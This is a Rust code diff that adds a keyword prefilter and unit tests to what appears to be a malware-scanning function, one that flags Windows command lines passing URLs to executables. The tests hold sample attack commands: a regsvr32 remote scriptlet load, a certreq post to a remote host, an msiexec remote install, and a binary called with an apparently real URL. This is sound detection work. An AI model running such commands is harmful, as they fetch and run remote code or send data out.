@@ -2755,6 +2755,10 @@ fn trim_url_suffix(url: &str) -> &str {
 }
 
 fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
+    if !has_process_url_argument_atom(deobfuscated) {
+        return;
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -2771,6 +2775,9 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
         .collect();
 
     for line in deobfuscated.lines() {
+        if !has_process_url_argument_line_atom(line) {
+            continue;
+        }
         for caps in PROCESS_URL_ARG_RE.captures_iter(line) {
             let Some(url) = caps
                 .get(1)
@@ -2841,6 +2848,77 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
             cmd: line.to_string(),
             url,
         });
+    }
+}
+
+fn has_process_url_argument_atom(text: &str) -> bool {
+    let has_urlish = [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+        || (text.contains('/') && text.contains('.'));
+    if !has_urlish {
+        return false;
+    }
+    [
+        b".exe".as_slice(),
+        b".com".as_slice(),
+        b".scr".as_slice(),
+        b".bat".as_slice(),
+        b".cmd".as_slice(),
+        b"regsvr32".as_slice(),
+        b"certreq".as_slice(),
+        b"msiexec".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+}
+
+fn has_process_url_argument_line_atom(line: &str) -> bool {
+    if !has_process_url_argument_atom(line) {
+        return false;
+    }
+    let trimmed = line.trim_start_matches(['@', ' ', '\t', '(']);
+    let first = trimmed
+        .split_ascii_whitespace()
+        .next()
+        .unwrap_or("")
+        .trim_matches('"')
+        .to_ascii_lowercase();
+    !matches!(first.as_str(), "set" | "setx" | "echo" | "rem" | "::")
+}
+
+#[cfg(test)]
+mod process_url_argument_prefilter_tests {
+    use super::{has_process_url_argument_atom, has_process_url_argument_line_atom};
+
+    #[test]
+    fn prefilter_allows_supported_process_url_argument_shapes() {
+        assert!(has_process_url_argument_atom(
+            r#"C:\Users\Public\calc.com "https://skynetx.com.br/html.html""#
+        ));
+        assert!(has_process_url_argument_atom(
+            "regsvr32 /s /n /u /i:http://regsvr32.example/payload.sct scrobj.dll"
+        ));
+        assert!(has_process_url_argument_atom(
+            r#"certreq -Post -config "https://certreq.example/submit" req out"#
+        ));
+        assert!(has_process_url_argument_atom(
+            "msiexec /quiet /imsiexec-attached.example/setup.msi"
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_url_text() {
+        assert!(!has_process_url_argument_atom(
+            "echo https://plain.example/payload"
+        ));
+        assert!(!has_process_url_argument_line_atom(
+            "set url=plain.example/payload.exe"
+        ));
     }
 }
 
